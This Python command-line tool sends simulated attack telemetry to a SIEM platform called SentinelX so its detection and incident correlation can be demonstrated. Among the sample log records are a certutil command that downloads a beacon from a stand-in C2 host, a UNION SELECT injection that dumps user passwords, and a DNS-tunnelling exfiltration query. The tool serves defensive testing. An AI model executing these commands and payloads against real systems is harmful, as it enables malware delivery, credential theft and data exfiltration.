"""Unified Red Team Attack & Multi-Stage Campaign Simulator (CLI).

Dispatches telemetry scenarios and end-to-end multi-stage APT attack chains
against SentinelX Ingest APIs to demonstrate real-time sliding-window detection,
alert deduplication, and kill-chain incident correlation.
"""

from __future__ import annotations

import argparse
import sys
import time
from datetime import UTC, datetime, timedelta
from typing import Any

import httpx

SCENARIO_CHOICES = [
    "killchain",
    "bruteforce",
    "portscan",
    "sqli",
    "dns_tunneling",
    "fim",
    "lolbas",
    "threat_intel",
    "vulnerability",
    "ml_anomaly",
    "graph_blast_radius",
    "risk_escalation",
    "forensics_triage",
    "cloud_misconfiguration",
    "all",
]


def build_events_for_scenario(scenario: str, target_host: str = "server-prod-01", target_ip: str = "192.168.1.10") -> list[dict[str, Any]]:
    """Builds SingleIngestRequest payloads matching SentinelX detection rules."""
    now = datetime.now(UTC)
    events: list[dict[str, Any]] = []

    if scenario in ("portscan", "killchain", "all"):
        # Port scan (12 distinct ports within window)
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 5432, 8080]
        for idx, port in enumerate(ports):
            events.append({
                "source_ip": "198.51.100.99",
                "destination_ip": target_ip,
                "destination_port": port,
                "source_port": 50000 + idx,
                "event_type": "connection",
                "target_host": target_host,
                "event_time": (now - timedelta(seconds=40 - idx * 2)).isoformat(),
                "raw_payload": f"TCP SYN probe 198.51.100.99 -> {target_ip}:{port} [SYN]",
                "details": {"proto": "tcp", "flag": "SYN", "port": port},
            })

    if scenario in ("bruteforce", "all"):
        # SSH Brute Force (6 failed logins)
        for idx in range(6):
            events.append({
                "source_ip": "198.51.100.55",
                "destination_ip": target_ip,
                "destination_port": 22,
                "source_port": 45000 + idx,
                "event_type": "auth_failed",
                "target_host": target_host,
                "event_time": (now - timedelta(seconds=20 - idx * 2)).isoformat(),
                "raw_payload": f"Failed password for invalid user admin_{idx} from 198.51.100.55 port {45000 + idx} ssh2",
                "details": {"user": f"admin_{idx}", "service": "sshd", "reason": "bad_password"},
            })

    if scenario in ("sqli", "killchain", "all"):
        # SQL Injection
        events.append({
            "source_ip": "198.51.100.42",
            "destination_ip": target_ip,
            "destination_port": 443,
            "source_port": 58210,
            "event_type": "web_request",
            "target_host": target_host,
            "event_time": (now - timedelta(seconds=15)).isoformat(),
            "raw_payload": "GET /api/v1/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1",
            "details": {
                "uri": "/api/v1/products?id=1 UNION SELECT null,username,password FROM users--",
                "method": "GET",
                "status_code": 200,
            },
        })

    if scenario in ("fim", "killchain", "all"):
        # Endpoint FIM File Tampering
        events.append({
            "source_ip": target_ip,
            "event_type": "endpoint_finding",
            "target_host": target_host,
            "event_time": (now - timedelta(seconds=10)).isoformat(),
            "raw_payload": "RULE-EDR-FIM-001 File Integrity Tampering: /etc/shadow modified unexpectedly (SHA256 mismatch)",
            "details": {
                "rule_id": "RULE-EDR-FIM-001",
                "path": "/etc/shadow",
                "action": "modified",
                "mitre_attack_id": "T1565.001",
            },
        })

    if scenario in ("lolbas", "all"):
        # LOLBAS Process Execution
        events.append({
            "source_ip": "192.168.1.100",
            "event_type": "endpoint_finding",
            "target_host": "ws-eng-100",
            "event_time": (now - timedelta(seconds=8)).isoformat(),
            "raw_payload": "RULE-EDR-CRADLE-001 certutil.exe -urlcache -split -f http://c2.apt29.org/beacon.exe C:\\temp\\beacon.exe",
            "details": {
                "rule_id": "RULE-EDR-CRADLE-001",
                "exe": "certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://c2.apt29.org/beacon.exe C:\\temp\\beacon.exe",
                "mitre_attack_id": "T1059.001",
            },
        })

    if scenario in ("dns_tunneling", "killchain", "all"):
        # DNS Tunneling Exfiltration
        events.append({
            "source_ip": target_ip,
            "destination_ip": "8.8.8.8",
            "destination_port": 53,
            "source_port": 54111,
            "event_type": "network_finding",
            "target_host": target_host,
            "event_time": (now - timedelta(seconds=5)).isoformat(),
            "raw_payload": "DNS Tunneling query A c2VjcmV0ZGF0YTEyMzQ1Nzg5MGFiY2RlZmdoaWprbG0.exfil.darkops.io (T1071.004)",
            "details": {
                "rule_id": "RULE-NET-DNS-001",
                "query": "c2VjcmV0ZGF0YTEyMzQ1Nzg5MGFiY2RlZmdoaWprbG0.exfil.darkops.io",
                "qtype": "A",
                "entropy": 3.84,
                "mitre_attack_id": "T1071.004",
            },
        })

    if scenario in ("threat_intel", "all"):
        # Threat Intel C2 IP Match
        events.append({
            "source_ip": "185.220.101.5",
            "destination_ip": target_ip,
            "destination_port": 443,
            "event_type": "threat_intel_match",
            "target_host": target_host,
            "event_time": (now - timedelta(seconds=3)).isoformat(),
            "raw_payload": "Inbound communication from known malicious C2 IP 185.220.101.5 (APT29)",
            "details": {
                "ioc_type": "ip",
                "indicator": "185.220.101.5",
                "threat_actor": "APT29",
                "feed": "alienvault_otx",
            },
        })

    if scenario in ("vulnerability", "all"):
        # CISA KEV Vulnerability Ingest
        events.append({
            "source_ip": "192.168.1.20",
            "event_type": "vulnerability_finding",
            "target_host": "db-prod-01",
            "event_time": now.isoformat(),
            "raw_payload": "CVE-2023-44487 HTTP/2 Rapid Reset Attack (CISA KEV: true, CVSS: 9.8)",
            "details": {
                "cve_id": "CVE-2023-44487",
                "cvss_score": 9.8,
                "cisa_kev": True,
                "package": "nghttp2",
            },
        })

    if scenario in ("ml_anomaly", "killchain", "all"):
        # ML Anomaly & UEBA Outlier
        events.append({
            "source_ip": "192.168.1.100",
            "destination_ip": "192.168.1.20",
            "destination_port": 5432,
            "event_type": "ml_anomaly",
            "target_host": "db-prod-01",
            "event_time": now.isoformat(),
            "raw_payload": "Off-hours access detected at 03:15 UTC; Statistically anomalous data volume (Z-Score: 4.364); Isolation Forest outlier (0.7765)",
            "details": {
                "rule_id": "RULE-ML-ANOMALY",
                "off_hours_access": True,
                "volume_z_score": 4.364,
                "isolation_forest_score": 0.7765,
                "bytes_transferred": 15000000,
            },
        })

    if scenario in ("graph_blast_radius", "all"):
        # Knowledge Graph Attack Path & Blast Exposure (RULE-GRAPH-001)
        events.append({
            "source_ip": "192.168.1.1",
            "destination_ip": "192.168.1.20",
            "destination_port": 5432,
            "event_type": "graph_finding",
            "target_host": "db-prod-01",
            "event_time": now.isoformat(),
            "raw_payload": "RULE-GRAPH-BLAST-RADIUS Transitive compromise path discovered to Crown Jewel (db-prod-01) with 3 reachable nodes (T1021)",
            "details": {
                "rule_id": "RULE-GRAPH-BLAST-RADIUS",
                "source": target_host,
                "crown_jewel": "db-prod-01",
                "hops": 2,
                "reachable_nodes": 3,
                "mitre_attack_id": "T1021",
            },
        })

    if scenario in ("risk_escalation", "all"):
        # Dynamic Risk Escalation (RULE-RISK-001)
        events.append({
            "source_ip": "192.168.1.10",
            "destination_ip": "192.168.1.20",
            "event_type": "risk_finding",
            "target_host": target_host,
            "event_time": now.isoformat(),
            "raw_payload": "RULE-RISK-DYNAMIC-ESCALATION Critical Multi-Factor Risk Score: 98/100 (CISA KEV active, Crown Jewel exposed, Velocity spike)",
            "details": {
                "rule_id": "RULE-RISK-DYNAMIC-ESCALATION",
                "risk_score": 98,
                "risk_tier": "critical",
                "asset_criticality": "critical",
                "cisa_kev": True,
                "mitre_attack_id": "T1190",
            },
        })

    if scenario in ("forensics_triage", "all"):
        # Automated Forensics Triage Finding (RULE-FORENSICS-001)
        events.append({
            "source_ip": "127.0.0.1",
            "destination_ip": target_ip,
            "event_type": "forensics_triage_package",
            "target_host": target_host,
            "event_time": now.isoformat(),
            "raw_payload": f"RULE-FORENSICS-TRIAGE-001 Forensics triage package sealed for {target_host}: reverse shell identified, chain_of_custody: VERIFIED",
            "details": {
                "rule_id": "RULE-FORENSICS-TRIAGE-001",
                "package_id": "pkg-simulated-01",
                "target_host": target_host,
                "suspicious_processes": 1,
                "chain_of_custody": "VERIFIED",
                "root_sha256": "0e08742a74adf6f9b8c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4",
                "mitre_attack_id": "T1059.004",
            },
        })

    if scenario in ("cloud_misconfiguration", "all"):
        # Cloud Security CSPM Misconfiguration (RULE-CLOUD-001)
        events.append({
            "source_ip": "198.51.100.88",
            "destination_ip": target_ip,
            "destination_port": 443,
            "source_port": 56100,
            "event_type": "cloud_misconfiguration_finding",
            "target_host": target_host,
            "event_time": now.isoformat(),
            "raw_payload": "RULE-CLOUD-001: Cloud Infrastructure Misconfiguration: S3 bucket s3_public_bucket financial-ledger exposed to AllUsers",
            "details": {
                "rule_id": "RULE-CLOUD-001",
                "benchmark_control": "CIS-AWS-2.1.1",
                "provider": "aws",
                "mitre_attack_id": "T1530",
            },
        })

    return events


def main() -> int:
    parser = argparse.ArgumentParser(description="Unified SentinelX Red Team Attack Simulator")
    parser.add_argument(
        "--scenario",
        choices=SCENARIO_CHOICES,
        default="killchain",
        help="Attack scenario to dispatch (default: killchain)",
    )
    parser.add_argument(
        "--api-url",
        default="http://localhost:8000",
        help="SentinelX API base URL (default: http://localhost:8000)",
    )
    parser.add_argument(
        "--api-key",
        default="sen_ingest_demo_key",
        help="API Key for telemetry ingestion (default: sen_ingest_demo_key)",
    )
    parser.add_argument(
        "--target-host",
        default="server-prod-01",
        help="Target CMDB hostname (default: server-prod-01)",
    )

    args = parser.parse_args()

    print("=" * 75)
    print(f" SentinelX Unified Attack & Campaign Simulator: [{args.scenario.upper()}]")
    print("=" * 75)
    print(f" API Base URL : {args.api_url}/api/v1/events/batch")
    print(f" Target Host  : {args.target_host}")
    print("-" * 75)

    events = build_events_for_scenario(args.scenario, target_host=args.target_host)
    print(f"[*] Generated {len(events)} telemetry events for scenario '{args.scenario}'...")

    headers = {
        "Content-Type": "application/json",
        "X-API-Key": args.api_key,
    }
    payload = {
        "events": events,
        "target_host": args.target_host,
    }

    t0 = time.perf_counter()
    try:
        resp = httpx.post(f"{args.api_url}/api/v1/events/batch", json=payload, headers=headers, timeout=10.0)
    except Exception as exc:
        print(f"[-] Connection error contacting SentinelX at {args.api_url}: {exc}", file=sys.stderr)
        return 1

    latency_ms = (time.perf_counter() - t0) * 1000.0

    if resp.status_code in (200, 201):
        data = resp.json()
        print(f"[+] Ingestion Success ({resp.status_code} Created) in {latency_ms:.1f} ms!")
        print(f"    - Ingested Count : {data.get('ingested_count', len(events))}")
        print(f"    - Ingestion Status: {data.get('status', 'success')}")
        print("\n[OK] Telemetry pipeline dispatched successfully.")
        print("    Open the SentinelX SOC Dashboard at http://localhost:5173 to observe alerts and correlated incidents!")
        return 0
    else:
        print(f"[-] Ingestion failed with status {resp.status_code}: {resp.text}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
